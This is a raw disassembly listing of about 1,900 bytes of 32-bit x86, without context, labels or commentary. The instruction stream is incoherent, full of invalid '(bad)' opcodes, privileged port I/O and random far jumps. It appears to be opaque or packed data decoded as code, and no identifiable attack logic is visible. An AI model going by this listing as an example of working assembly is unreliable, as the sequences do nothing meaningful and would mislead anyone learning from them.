  40bc10:	mov    edi,0xb6e864fe
  40bc15:	in     al,0x57
  40bc17:	mov    al,BYTE PTR [edi-0x6c]
  40bc1a:	popf   
  40bc1b:	into   
  40bc1c:	jb     0x40bbc7
  40bc1e:	mov    edx,0x33a98e93
  40bc23:	int3   
  40bc24:	push   cs
  40bc25:	in     eax,dx
  40bc26:	hlt    
  40bc27:	(bad)  
  40bc28:	xlat   BYTE PTR ds:[ebx]
  40bc29:	xor    ebp,DWORD PTR ds:0x674d0f90
  40bc2f:	mov    esi,0x6cef0be0
  40bc34:	pushf  
  40bc35:	xor    edx,DWORD PTR ds:0x9a25
  40bc3a:	dec    edx
  40bc3b:	sbb    ebp,DWORD PTR [edx-0x406d76e4]
  40bc41:	push   edi
  40bc42:	test   DWORD PTR [ebx+0x4fa58077],0x9c8debd6
  40bc4c:	sub    edi,ecx
  40bc4e:	mov    edx,0xe49280c0
  40bc53:	mov    ebp,0x3e5d4f93
  40bc58:	clc    
  40bc59:	leave  
  40bc5a:	inc    ecx
  40bc5b:	enter  0xd719,0xb6
  40bc5f:	adc    eax,0x917a4de6
  40bc64:	sbb    eax,0xeb1160c0
  40bc69:	dec    ebp
  40bc6a:	adc    BYTE PTR [eax-0x43509954],bl
  40bc70:	sti    
  40bc71:	xor    cl,cl
  40bc73:	dec    edi
  40bc74:	std    
  40bc75:	fnsave [esi+0x2e]
  40bc78:	cld    
  40bc79:	adc    eax,0x8058ba93
  40bc7e:	fwait
  40bc7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc80:	(bad)  
  40bc81:	repnz push 0xffffffd1
  40bc84:	pop    ebp
  40bc85:	daa    
  40bc86:	popf   
  40bc87:	pop    esp
  40bc88:	dec    ebx
  40bc89:	retfw  0xc7fe
  40bc8d:	ja     0x40bcf2
  40bc8f:	popa   
  40bc90:	mov    ds:0x58c5fc07,eax
  40bc95:	nop
  40bc96:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40bc98:	jmp    0x5cc012a0
  40bc9d:	outs   dx,BYTE PTR ds:[esi]
  40bc9e:	mov    al,0xf3
  40bca0:	pop    ecx
  40bca1:	in     al,0xd4
  40bca3:	pop    ebx
  40bca4:	jp     0x40bc5f
  40bca6:	cmp    BYTE PTR [esi+0x40387dcd],ch
  40bcac:	je     0x40bcde
  40bcae:	leave  
  40bcaf:	mov    eax,ds:0x80bcb3e0
  40bcb4:	jbe    0xf43943c9
  40bcba:	add    esp,ebx
  40bcbc:	outs   dx,DWORD PTR ds:[esi]
  40bcbd:	inc    DWORD PTR [edx-0x21]
  40bcc0:	inc    ebp
  40bcc1:	mov    ecx,0xfbd4dcfb
  40bcc6:	xchg   esi,eax
  40bcc7:	int3   
  40bcc8:	jg     0x40bd08
  40bcca:	frndint 
  40bccc:	xchg   ebp,eax
  40bccd:	in     al,dx
  40bcce:	jno    0x40bc72
  40bcd0:	xchg   edi,eax
  40bcd1:	sbb    dl,BYTE PTR [edx]
  40bcd3:	lahf   
  40bcd4:	pop    es
  40bcd5:	push   ebx
  40bcd6:	std    
  40bcd7:	mov    ah,BYTE PTR [eax-0x92ca121]
  40bcdd:	fisttp QWORD PTR [ecx]
  40bcdf:	adc    al,0xfe
  40bce1:	jp     0x40bcb4
  40bce3:	jno    0x40bca3
  40bce5:	add    BYTE PTR [edx-0x5b],ah
  40bce8:	mov    bh,0x49
  40bcea:	cli    
  40bceb:	test   al,0xd7
  40bced:	retf   
  40bcee:	mov    edi,0x3a5a8940
  40bcf3:	(bad)  
  40bcf4:	push   esi
  40bcf5:	iret   
  40bcf6:	in     al,dx
  40bcf7:	and    ah,BYTE PTR [ebx+eiz*2-0x72]
  40bcfb:	clc    
  40bcfc:	sbb    eax,0x850f0bcb
  40bd01:	scas   al,BYTE PTR es:[edi]
  40bd02:	jl     0x40bd3e
  40bd04:	enter  0xda05,0x44
  40bd08:	das    
  40bd09:	out    0x6e,al
  40bd0b:	in     al,dx
  40bd0c:	inc    esp
  40bd0d:	inc    edi
  40bd0e:	adc    eax,esp
  40bd10:	add    cl,bl
  40bd12:	imul   DWORD PTR [ebx+0x1e808b5d]
  40bd18:	or     DWORD PTR [eax+0x1b274197],ebx
  40bd1e:	pop    eax
  40bd1f:	sub    BYTE PTR [ecx+ebp*1+0x35],bh
  40bd23:	mov    dh,0xe5
  40bd25:	cmp    eax,0x75313884
  40bd2a:	iret   
  40bd2b:	int    0x21
  40bd2d:	(bad)
  40bd31:	sbb    bh,BYTE PTR [ebx-0x20d67f7f]
  40bd37:	(bad)  
  40bd38:	cmp    eax,0xa48bcf91
  40bd3d:	jg     0x40bd8f
  40bd3f:	pop    esp
  40bd40:	imul   eax,DWORD PTR ds:0x679d77fe,0x3232b111
  40bd4a:	(bad)  
  40bd4b:	enter  0xede5,0xae
  40bd4f:	inc    esp
  40bd50:	dec    edi
  40bd51:	mov    al,0xaf
  40bd53:	call   0x5bc8:0x53facf5b
  40bd5a:	icebp  
  40bd5b:	mov    ch,0x26
  40bd5d:	nop
  40bd5e:	cwde   
  40bd5f:	ins    DWORD PTR es:[edi],dx
  40bd60:	inc    ecx
  40bd61:	inc    edi
  40bd62:	test   DWORD PTR [edx-0x5f],esi
  40bd65:	idiv   DWORD PTR [eax-0x44]
  40bd68:	dec    edx
  40bd69:	cmp    eax,0xa93a7e29
  40bd6e:	out    dx,al
  40bd6f:	adc    BYTE PTR [ebp-0x497584f4],bl
  40bd75:	push   cs
  40bd76:	mov    eax,ds:0xd66cb2ee
  40bd7b:	xlat   BYTE PTR ds:[ebx]
  40bd7c:	sub    eax,0xc5bc3a1f
  40bd81:	outs   dx,DWORD PTR ds:[esi]
  40bd82:	or     dl,BYTE PTR [esi+0x4f]
  40bd85:	js     0x40bd6c
  40bd87:	add    eax,0xdfb86546
  40bd8c:	loopne 0x40bdef
  40bd8e:	jmp    0xa4f2:0x1874c7cf
  40bd95:	pop    DWORD PTR cs:[edi]
  40bd98:	push   0x22630394
  40bd9d:	jg     0x40bdad
  40bd9f:	push   ebx
  40bda0:	aaa    
  40bda1:	adc    dl,BYTE PTR [eax+0x4a]
  40bda4:	adc    edx,DWORD PTR [esp+edx*1+0x2c3997c8]
  40bdab:	cmc    
  40bdac:	(bad)  
  40bdad:	fisttp WORD PTR [edx+esi*4-0xf]
  40bdb1:	iret   
  40bdb2:	push   0x2b1d54a9
  40bdb7:	enter  0xc627,0xbe
  40bdbb:	daa    
  40bdbc:	cmc    
  40bdbd:	or     BYTE PTR [eax],0xe9
  40bdc0:	xor    cl,BYTE PTR [ecx+eiz*2-0xbc373a]
  40bdc7:	sbb    DWORD PTR [ebx+0x6da21173],esi
  40bdcd:	daa    
  40bdce:	scas   al,BYTE PTR es:[edi]
  40bdcf:	cmp    ebx,DWORD PTR [edx-0x1bbe8f3b]
  40bdd5:	xor    ebp,DWORD PTR [edi]
  40bdd7:	call   0xebedec7a
  40bddc:	repnz push ebx
  40bdde:	sti    
  40bddf:	addr16 push 0xffffffeb
  40bde2:	mov    ebp,fs
  40bde4:	adc    eax,edi
  40bde6:	or     DWORD PTR [edx+0x28],0xffffff88
  40bdea:	fdiv   QWORD PTR [esi+0x70703456]
  40bdf0:	lods   al,BYTE PTR ds:[esi]
  40bdf1:	sub    BYTE PTR [eax-0x47],bh
  40bdf4:	inc    esp
  40bdf5:	dec    esp
  40bdf6:	clc    
  40bdf7:	out    0xe7,al
  40bdf9:	fild   WORD PTR [edi]
  40bdfb:	push   esi
  40bdfc:	sub    BYTE PTR ds:0x33a70bde,0x5
  40be03:	adc    ebp,edi
  40be05:	mov    edx,0x20901745
  40be0a:	stc    
  40be0b:	push   ebp
  40be0c:	jno    0x40be42
  40be0e:	jns    0x40bdea
  40be10:	js     0x40be16
  40be12:	(bad)  
  40be13:	(bad)  
  40be14:	and    ebx,DWORD PTR [ebp+0x5d]
  40be17:	dec    edx
  40be18:	xchg   edi,eax
  40be19:	add    edx,DWORD PTR [eax+0x48]
  40be1c:	dec    esp
  40be1d:	les    esi,FWORD PTR [esi-0xd]
  40be20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be21:	mov    esp,0xd1c7dcfe
  40be26:	jl     0x40be28
  40be28:	jmp    0x32de06d7
  40be2d:	mov    ebx,0xe0e8ad95
  40be32:	or     al,0xe4
  40be34:	popf   
  40be35:	test   BYTE PTR [esi],dh
  40be37:	leave  
  40be38:	or     eax,0xf2ce744b
  40be3d:	std    
  40be3e:	(bad)  
  40be3f:	add    ah,BYTE PTR [esi+0x6ac1379f]
  40be45:	test   BYTE PTR [esi+0x564bcd79],ah
  40be4b:	shl    BYTE PTR [ecx-0xe0cafa1],0x7e
  40be52:	add    eax,0x1402a13a
  40be57:	inc    edx
  40be58:	push   esi
  40be59:	and    bl,cl
  40be5b:	inc    esp
  40be5c:	push   0xb
  40be5e:	in     al,dx
  40be5f:	xchg   edx,eax
  40be60:	push   es
  40be61:	push   es
  40be62:	aas    
  40be63:	cmp    edx,eax
  40be65:	push   0x35
  40be67:	or     ebp,ebp
  40be69:	or     DWORD PTR [ebx],esi
  40be6b:	cmp    DWORD PTR [eax-0x35f89ad8],ebx
  40be71:	sti    
  40be72:	ss std 
  40be74:	mov    al,ds:0x6fd4e79c
  40be79:	pop    edi
  40be7a:	mov    al,ds:0x7ac915a2
  40be7f:	mov    edi,0xae1d493a
  40be84:	lods   eax,DWORD PTR ds:[esi]
  40be85:	cmp    dl,al
  40be87:	lods   eax,DWORD PTR fs:[esi]
  40be89:	jns    0x40be50
  40be8b:	retf   0x4348
  40be8e:	bound  edi,QWORD PTR [edi-0x5]
  40be91:	mov    WORD PTR [esi+eax*8],?
  40be94:	cmp    ch,bl
  40be96:	push   ebx
  40be97:	mov    eax,ds:0x5a13914f
  40be9c:	jo     0x40be8b
  40be9e:	pop    ss
  40be9f:	add    al,0x6d
  40bea1:	xor    eax,0x1f5dbb8b
  40bea6:	add    ecx,DWORD PTR [esi-0x25be6191]
  40beac:	enter  0x6003,0x32
  40beb0:	out    0xcc,eax
  40beb2:	js     0x40bf07
  40beb4:	add    BYTE PTR [esi],al
  40beb6:	pop    es
  40beb7:	loop   0x40be4b
  40beb9:	dec    esi
  40beba:	in     eax,dx
  40bebb:	dec    ebx
  40bebc:	fidiv  WORD PTR [ebp+0x22faa726]
  40bec2:	sub    BYTE PTR [esi-0x6d63b314],0x9
  40bec9:	add    al,0x89
  40becb:	outs   dx,DWORD PTR ds:[esi]
  40becc:	aas    
  40becd:	(bad)  
  40bece:	sbb    edx,DWORD PTR [edi+ebp*8+0x93bbae9]
  40bed5:	imul   esp,DWORD PTR [edi-0x1d438cfa],0xbc886b3d
  40bedf:	inc    eax
  40bee0:	or     al,0x61
  40bee2:	(bad)  
  40bee3:	imul   ebx,DWORD PTR [esi-0x14],0x1a5e4d82
  40beea:	cmp    edi,DWORD PTR [ecx+0x33a646d7]
  40bef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bef1:	test   al,0x69
  40bef3:	adc    BYTE PTR [edi-0x6],bh
  40bef6:	push   esi
  40bef7:	lock cmp eax,0xc7aa305b
  40befd:	inc    ecx
  40befe:	je     0x40bedc
  40bf00:	mov    ecx,0x6ff15123
  40bf05:	push   edx
  40bf06:	retf   
  40bf07:	mov    WORD PTR [ebp+0x4],es
  40bf0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf0b:	into   
  40bf0c:	and    DWORD PTR [eax+ebx*8-0x33c32418],0xa
  40bf14:	je     0x40bea8
  40bf16:	jae    0x40bf06
  40bf18:	xchg   esp,eax
  40bf19:	lods   eax,DWORD PTR ds:[esi]
  40bf1a:	(bad)  
  40bf1b:	in     al,dx
  40bf1c:	fstp   DWORD PTR [edx-0x69]
  40bf1f:	push   ebp
  40bf20:	out    0xc7,al
  40bf22:	pop    edi
  40bf23:	into   
  40bf24:	xchg   edx,eax
  40bf25:	inc    edx
  40bf26:	dec    esp
  40bf27:	rcl    DWORD PTR [ebx+edi*4+0x2d],1
  40bf2b:	gs pop ds
  40bf2d:	cmc    
  40bf2e:	mov    esi,0x85588021
  40bf33:	loopne 0x40bf28
  40bf35:	ins    DWORD PTR es:[edi],dx
  40bf36:	inc    edx
  40bf37:	pushf  
  40bf38:	in     al,0xb7
  40bf3a:	adc    eax,0x40831ec1
  40bf3f:	add    DWORD PTR [esi+0x71],edx
  40bf42:	pop    edx
  40bf43:	jle    0x40bf04
  40bf45:	dec    eax
  40bf46:	and    DWORD PTR [esi+edx*1],eax
  40bf49:	(bad)  
  40bf4a:	push   0xb
  40bf4c:	cmp    eax,0x4a28468
  40bf51:	retf   
  40bf52:	jecxz  0x40bf49
  40bf54:	cmp    eax,0x70e01a96
  40bf59:	test   DWORD PTR [eax-0x59],0x48fba513
  40bf60:	clc    
  40bf61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf62:	add    dh,BYTE PTR es:[ecx-0x4220fd14]
  40bf69:	pop    ebp
  40bf6a:	aaa    
  40bf6b:	mov    ebp,0xa7fdae98
  40bf70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf71:	mov    eax,0xa4464761
  40bf76:	arpl   WORD PTR [edx+0x4f1c3f74],dx
  40bf7c:	or     eax,0x15
  40bf7f:	mov    ecx,ebx
  40bf81:	out    0x78,al
  40bf83:	gs adc al,0xc2
  40bf86:	push   ebx
  40bf87:	iret   
  40bf88:	retf   0x180f
  40bf8b:	(bad)  
  40bf8c:	ficom  DWORD PTR [esi+0x51]
  40bf8f:	jge    0x40bf50
  40bf91:	loope  0x40bfbc
  40bf93:	icebp  
  40bf94:	adc    BYTE PTR [ebx-0x782eebf5],0xb8
  40bf9b:	jae    0x40bfaf
  40bf9d:	fcomp  DWORD PTR [eax-0x53]
  40bfa0:	imul   ebp,DWORD PTR [ebp-0x6331aeaa],0x24
  40bfa7:	data16 shr BYTE PTR [edi],0x9d
  40bfab:	fidivr WORD PTR [edi+0x49]
  40bfae:	pop    eax
  40bfaf:	or     ah,dl
  40bfb1:	scas   al,BYTE PTR es:[edi]
  40bfb2:	sti    
  40bfb3:	mov    cl,0x2e
  40bfb5:	pop    eax
  40bfb6:	sbb    dh,ch
  40bfb8:	cmovb  edi,DWORD PTR [esi]
  40bfbb:	fst    DWORD PTR [eax]
  40bfbd:	aam    0xe1
  40bfbf:	call   0xa9ba:0x50dd6153
  40bfc6:	mov    al,ds:0x57e7a6c0
  40bfcb:	test   DWORD PTR ds:0x819013fe,0x70471132
  40bfd5:	(bad)  
  40bfd6:	mov    esp,0x6a1f28b3
  40bfdb:	div    BYTE PTR ds:0xbad40adb
  40bfe1:	cmp    al,0xcf
  40bfe3:	sub    al,ch
  40bfe5:	push   0x2f
  40bfe7:	dec    edi
  40bfe8:	bound  esp,QWORD PTR [esi+0x173d1892]
  40bfee:	or     al,BYTE PTR [esi]
  40bff0:	in     eax,dx
  40bff1:	test   DWORD PTR [ebx+0x26],eax
  40bff4:	mov    cs,WORD PTR [eax+esi*1+0x59d699dd]
  40bffb:	xlat   BYTE PTR ds:[ebx]
  40bffc:	inc    ecx
  40bffd:	add    BYTE PTR [ebp-0x7dc55353],ah
  40c003:	adc    eax,0x3a8ec37a
  40c008:	stc    
  40c009:	lea    ebp,[esi-0x10]
  40c00c:	aam    0x8c
  40c00e:	js     0x40bff7
  40c010:	rcl    bh,cl
  40c012:	jp     0x40bf97
  40c014:	rcl    BYTE PTR ds:0xcbb276d,1
  40c01a:	fcomp  DWORD PTR [ebx]
  40c01c:	mov    eax,0x81152936
  40c021:	shr    BYTE PTR [edx+ecx*8-0x51],0x66
  40c026:	rcr    BYTE PTR [edx],cl
  40c028:	ins    BYTE PTR es:[edi],dx
  40c029:	icebp  
  40c02a:	sub    BYTE PTR [esi+0x3361b5df],dl
  40c030:	mov    al,ds:0xd0669cf5
  40c035:	sbb    al,0xaf
  40c037:	int3   
  40c038:	call   ecx
  40c03a:	jb     0x40c04c
  40c03c:	push   edx
  40c03d:	test   eax,0x5a9c508a
  40c042:	aad    0xdf
  40c044:	add    ecx,DWORD PTR [ebx+0xd]
  40c047:	jmp    0xd57947ee
  40c04c:	ret    
  40c04d:	out    0x2,al
  40c04f:	ror    ecx,cl
  40c051:	pop    edi
  40c052:	sti    
  40c053:	push   ebx
  40c054:	ins    BYTE PTR es:[edi],dx
  40c055:	test   edi,0xf766f3b2
  40c05b:	enter  0x1a35,0x67
  40c05f:	frstor ds:0x2cde848f
  40c065:	xchg   ebp,eax
  40c066:	pop    esi
  40c067:	sub    BYTE PTR ds:0x96fb24b0,ah
  40c06d:	test   DWORD PTR [edx+0x4f],edx
  40c070:	(bad)  
  40c071:	inc    edx
  40c072:	rcl    BYTE PTR ds:0x81e50770,0xba
  40c079:	scas   al,BYTE PTR es:[edi]
  40c07a:	in     eax,0xc2
  40c07c:	push   es
  40c07d:	jno    0x40c0a0
  40c07f:	aas    
  40c080:	dec    ebp
  40c081:	test   eax,0x2a42e3e2
  40c086:	dec    esp
  40c087:	xor    DWORD PTR [ecx],ebp
  40c089:	or     eax,0xbd7eba04
  40c08e:	dec    ecx
  40c08f:	lods   al,BYTE PTR ds:[esi]
  40c090:	xor    DWORD PTR [edi-0x7b],esi
  40c093:	or     ah,BYTE PTR [ebp+0x73554a2d]
  40c099:	xor    esi,ebp
  40c09b:	loop   0x40c05d
  40c09d:	stos   DWORD PTR es:[edi],eax
  40c09e:	or     edi,0x6d4297f7
  40c0a4:	sub    BYTE PTR [eax],bl
  40c0a6:	fist   DWORD PTR [edx+0x256d95d9]
  40c0ac:	bound  ecx,QWORD PTR [ebp+0x3d]
  40c0af:	dec    edi
  40c0b0:	mov    esi,0xc94eceae
  40c0b5:	(bad)  
  40c0b7:	int    0x78
  40c0b9:	pop    es
  40c0ba:	pop    edi
  40c0bb:	jg     0x40c0d1
  40c0bd:	and    DWORD PTR [esi],ebp
  40c0bf:	test   BYTE PTR [ebx],bl
  40c0c1:	test   eax,0x318b1a05
  40c0c6:	pop    ds
  40c0c7:	test   DWORD PTR [ebx],eax
  40c0c9:	std    
  40c0ca:	dec    eax
  40c0cb:	xchg   ecx,eax
  40c0cc:	das    
  40c0cd:	ret    
  40c0ce:	mov    ecx,DWORD PTR [esi]
  40c0d0:	test   eax,0xb71b8337
  40c0d5:	outs   dx,DWORD PTR ds:[esi]
  40c0d6:	or     al,0xd8
  40c0d8:	imul   ebx,DWORD PTR [edx],0x9
  40c0db:	jo     0x40c13b
  40c0dd:	gs pop edx
  40c0df:	and    eax,0x43d3509e
  40c0e5:	retf   
  40c0e6:	adc    ebp,DWORD PTR [ebp+0x5c162904]
  40c0ec:	push   ecx
  40c0ed:	sub    DWORD PTR [esi+eiz*4-0x47],0xffffffaf
  40c0f2:	cmp    cl,BYTE PTR [edi+0x72bae086]
  40c0f8:	mov    ah,0x5b
  40c0fa:	push   es
  40c0fb:	adc    DWORD PTR [esi],0x5
  40c0fe:	test   BYTE PTR [esi+0x42],0xea
  40c102:	add    eax,0x63c88b67
  40c107:	mov    eax,0xf445622d
  40c10c:	add    al,0x4b
  40c10e:	jno    0x40c17b
  40c110:	cmp    BYTE PTR [esi-0x575dfaea],dh
  40c116:	gs add al,0x79
  40c119:	mov    DWORD PTR [edi-0x1ef7002a],esp
  40c11f:	jmp    DWORD PTR [edx]
  40c121:	call   0x51965373
  40c126:	sti    
  40c127:	lods   al,BYTE PTR ss:[esi]
  40c129:	and    ah,BYTE PTR [esi+0xb9c1bd7]
  40c12f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c130:	push   edx
  40c131:	fist   DWORD PTR [eax-0x578c85de]
  40c137:	pusha  
  40c138:	mov    ah,0x28
  40c13a:	or     eax,0x3c5fb800
  40c13f:	adc    al,0x16
  40c141:	xor    al,0xdc
  40c143:	call   0x3cd4:0x639fbdd3
  40c14a:	mov    bh,0xe3
  40c14c:	add    eax,0x70727a81
  40c151:	add    BYTE PTR cs:[ecx+0x53],ch
  40c155:	popa   
  40c156:	or     BYTE PTR [eax+edx*2-0x2ce742d6],ah
  40c15d:	test   dh,ah
  40c15f:	dec    dl
  40c161:	mov    es,WORD PTR [ebx+eiz*8+0x46]
  40c165:	xchg   edx,eax
  40c166:	mov    bl,0x1e
  40c168:	stos   WORD PTR es:[edi],ax
  40c16a:	sbb    al,0x64
  40c16c:	or     dl,BYTE PTR [esi+ebx*2+0x3dcb09e5]
  40c173:	lsl    ebx,WORD PTR [ecx+ebx*1]
  40c177:	pop    eax
  40c178:	mov    ds:0x5a1df569,al
  40c17d:	fisubr WORD PTR [ebx-0x4f03374f]
  40c183:	enter  0xc781,0x29
  40c187:	aad    0x3c
  40c189:	les    edi,FWORD PTR [ebx]
  40c18b:	pop    ecx
  40c18c:	jmp    0x40c189
  40c18e:	inc    eax
  40c18f:	add    ecx,DWORD PTR ss:[edx+0x7b]
  40c193:	add    BYTE PTR [edi],ah
  40c195:	popa   
  40c196:	adc    BYTE PTR [eax+0x5b],dl
  40c199:	sahf   
  40c19a:	inc    edx
  40c19b:	repnz mov ebx,0x6305daee
  40c1a1:	repz push esp
  40c1a3:	test   esp,eax
  40c1a5:	or     DWORD PTR [ebp+0x58],ebp
  40c1a8:	mov    dh,BYTE PTR [esi+0x4]
  40c1ab:	popf   
  40c1ac:	dec    esp
  40c1ad:	sub    edi,DWORD PTR [eax+0x1d]
  40c1b0:	daa    
  40c1b1:	and    DWORD PTR [ebx-0x453e868],esi
  40c1b7:	cpuid  
  40c1b9:	and    eax,0xc17a205e
  40c1be:	popa   
  40c1bf:	sbb    BYTE PTR [esp+esi*2-0x5b3f1524],dl
  40c1c6:	aas    
  40c1c7:	cld    
  40c1c8:	aas    
  40c1c9:	mov    esi,0x9fc7d329
  40c1ce:	inc    esi
  40c1cf:	imul   esp,DWORD PTR [ebx-0x148fc31c],0xe0b38dd2
  40c1d9:	xchg   ecx,eax
  40c1da:	inc    edi
  40c1db:	in     eax,0x1c
  40c1dd:	and    DWORD PTR [esi],0xfffffffa
  40c1e0:	pop    ebp
  40c1e1:	retf   
  40c1e2:	lods   eax,DWORD PTR ds:[esi]
  40c1e3:	push   DWORD PTR [edi]
  40c1e5:	or     edi,DWORD PTR [ebx]
  40c1e7:	loope  0x40c20d
  40c1e9:	pop    esp
  40c1ea:	and    al,0xe9
  40c1ec:	hlt    
  40c1ed:	pop    edx
  40c1ee:	lods   al,BYTE PTR ds:[esi]
  40c1ef:	mov    esp,0x73e7dcce
  40c1f4:	inc    eax
  40c1f5:	nop
  40c1f6:	mov    edi,0x99bf4ede
  40c1fb:	mov    esp,0x89a2d05e
  40c200:	pop    ecx
  40c201:	out    dx,eax
  40c202:	inc    esi
  40c203:	scas   al,BYTE PTR es:[edi]
  40c204:	ss mov edx,0xbfd51502
  40c20a:	xor    BYTE PTR [ebx+0x8],0xa6
  40c20e:	(bad)  
  40c20f:	and    al,0x8d
  40c211:	mov    dl,0x59
  40c213:	aad    0xf0
  40c215:	fdivp  st(3),st
  40c217:	push   esi
  40c218:	jmp    0x40c1df
  40c21a:	jmp    0x1acb3027
  40c21f:	sti    
  40c220:	outs   dx,DWORD PTR ds:[esi]
  40c221:	mov    al,0x0
  40c223:	push   ebx
  40c224:	mov    edi,0x84f8a1bc
  40c229:	inc    ebx
  40c22a:	push   ss
  40c22b:	jl     0x40c1cf
  40c22d:	test   DWORD PTR [esi+ecx*8-0x2f],eax
  40c231:	xor    al,0x27
  40c233:	inc    edi
  40c234:	sbb    al,0x1d
  40c236:	mov    dl,0x2e
  40c238:	sub    BYTE PTR [eax*8-0x3fe4bf7e],bl
  40c23f:	rol    DWORD PTR [esi+0x5c77e7e8],cl
  40c245:	ficomp WORD PTR ds:0x279364a7
  40c24b:	adc    DWORD PTR [edi],ebx
  40c24d:	inc    edi
  40c24e:	std    
  40c24f:	dec    edx
  40c250:	inc    edx
  40c251:	sub    al,0x9b
  40c253:	pop    ss
  40c254:	cmp    BYTE PTR [edx-0x72],0xba
  40c258:	or     eax,0x669a6783
  40c25d:	mov    edx,0xb5b6444e
  40c262:	out    0x94,eax
  40c264:	enter  0x31c6,0x22
  40c268:	mov    WORD PTR [ebp+0x70],gs
  40c26b:	sub    dl,0x37
  40c26e:	sub    BYTE PTR [esi-0x6c3c7f26],bl
  40c274:	xchg   esi,eax
  40c275:	mov    bl,0x8c
  40c277:	bound  esp,QWORD PTR [edi+0x34]
  40c27a:	sub    edi,DWORD PTR [eax-0x23]
  40c27d:	pop    es
  40c27e:	fstp   TBYTE PTR [eax+0x50b8b62f]
  40c284:	ret    
  40c285:	sbb    eax,0xa1ae14be
  40c28a:	leave  
  40c28b:	pop    ss
  40c28c:	xor    ecx,esp
  40c28e:	dec    edx
  40c28f:	jne    0x40c235
  40c291:	cdq    
  40c292:	repnz sub DWORD PTR [esi],edx
  40c295:	xor    DWORD PTR [edi-0xee9d6e5],esi
  40c29b:	sub    BYTE PTR [edi],ch
  40c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c29e:	mov    bl,0xbc
  40c2a0:	test   eax,0xd6de467d
  40c2a5:	xor    al,0x69
  40c2a7:	fwait
  40c2a8:	rcr    BYTE PTR [edx],0xd8
  40c2ab:	sbb    BYTE PTR [eax-0x5c37ef60],dh
  40c2b1:	rcl    BYTE PTR [edi],0xca
  40c2b4:	add    eax,0xf9e32ab4
  40c2b9:	jl     0x40c30a
  40c2bb:	dec    ebx
  40c2bc:	and    eax,0xaeb80a02
  40c2c1:	shl    BYTE PTR [edi],cl
  40c2c3:	test   ebx,esi
  40c2c5:	mov    dl,0x0
  40c2c7:	jmp    0x89c8:0x9d83d598
  40c2ce:	cmp    al,0xc2
  40c2d0:	dec    esi
  40c2d1:	js     0x40c2ed
  40c2d3:	clc    
  40c2d4:	mov    ch,0x20
  40c2d6:	xor    ebp,DWORD PTR [ecx-0xd]
  40c2d9:	adc    DWORD PTR [esi-0x6f5acdd3],0x16
  40c2e0:	enter  0xe431,0x5d
  40c2e4:	dec    esp
  40c2e5:	xchg   esp,eax
  40c2e6:	cli    
  40c2e7:	xor    eax,0xfee8af16
  40c2ec:	int    0xfa
  40c2ee:	mov    DWORD PTR [esi+0x3c],edi
  40c2f1:	lock xchg BYTE PTR [ecx+0x12],dl
  40c2f5:	push   ebx
  40c2f6:	mov    dh,0xd2
  40c2f8:	icebp  
  40c2f9:	stc    
  40c2fa:	test   DWORD PTR [ebx+0x449df102],ebp
  40c300:	adc    ah,bh
  40c302:	sub    ch,BYTE PTR [edx+esi*4+0x65]
  40c306:	mov    dh,BYTE PTR [esi-0xf3bc4e0]
  40c30c:	add    BYTE PTR [esi+eax*1],bh
  40c30f:	loop   0x40c352
  40c311:	push   esp
  40c312:	mov    esp,0xd7bf48cb
  40c317:	cli    
  40c318:	mul    esi
  40c31a:	scas   eax,DWORD PTR es:[edi]
  40c31b:	sbb    dh,BYTE PTR [ebx+esi*1]
  40c31e:	jl     0x40c368
  40c320:	inc    ecx
  40c321:	xor    al,0x2d
  40c323:	push   eax
  40c324:	cmp    ebp,ebx
  40c326:	imul   ebx,DWORD PTR [edx+eiz*8-0x404ca8cc],0x15
  40c32e:	mov    ebp,cs
  40c330:	and    al,0x1b
  40c332:	or     edi,DWORD PTR [edi]
  40c334:	mov    bl,0x3d
  40c336:	es mov eax,0x2cf7df3
  40c33c:	jmp    0x6aff:0x2c9db90e
  40c343:	lods   eax,DWORD PTR ds:[esi]
  40c344:	dec    ebx
  40c345:	xchg   ecx,eax
  40c346:	and    al,0x1b
  40c348:	xchg   esi,eax
  40c349:	jl     0x40c34a
  40c34b:	xchg   ebx,eax
  40c34c:	fadd   st(2),st
  40c34e:	scas   al,BYTE PTR es:[edi]
  40c34f:	icebp  
  40c350:	mov    al,ds:0xb0b0fd99
  40c355:	xchg   edi,eax
  40c356:	mov    al,0x88
  40c358:	lods   eax,DWORD PTR ds:[esi]
  40c359:	aam    0x3c
  40c35b:	add    BYTE PTR [edx+0x62],0x7
  40c35f:	cmp    bl,ah
  40c361:	mov    eax,ds:0x2840a6df
  40c366:	add    al,0xb0
  40c368:	jecxz  0x40c3aa
  40c36a:	lods   al,BYTE PTR ds:[esi]
  40c36b:	enter  0x9e3a,0x3f
  40c36f:	cwde   
  40c370:	pop    ebp
  40c371:	pop    ebp
  40c372:	mov    ebp,0x51eb4c66
  40c377:	ins    DWORD PTR es:[edi],dx
  40c378:	mov    dh,0x95
  40c37a:	push   cs
  40c37b:	cmc    
  40c37c:	loop   0x40c3bd
  40c37e:	in     eax,dx
  40c37f:	cmp    DWORD PTR [eax-0x12],esp
  40c382:	jb     0x40c33f
  40c384:	or     edi,esp
  40c386:	add    ch,BYTE PTR [eax-0x4fdd3155]
  40c38c:	jg     0x40c409
  40c38e:	dec    esp
  40c38f:	les    esp,FWORD PTR [eax]
  40c391:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c392:	cmp    esp,DWORD PTR [esi]
  40c394:	sbb    DWORD PTR [eax-0x5a7eca3],eax
  40c39a:	test   DWORD PTR [edx-0x749546cf],ebx
  40c3a0:	and    cl,al
  40c3a2:	pop    ebx
  40c3a3:	fstp   QWORD PTR [ebp*1-0xa583cb3]
  40c3aa:	sbb    al,0x30
  40c3ac:	stos   BYTE PTR es:[edi],al
  40c3ad:	outs   dx,BYTE PTR ds:[esi]
  40c3ae:	into   
  40c3af:	mov    ecx,0x8db55fbc
  40c3b4:	inc    ebx
  40c3b5:	fs int3 
  40c3b7:	fiadd  DWORD PTR [edi]
  40c3b9:	mov    eax,ds:0xae2ec4e7
  40c3be:	pop    esp
  40c3bf:	fild   WORD PTR [ebp+0x47]
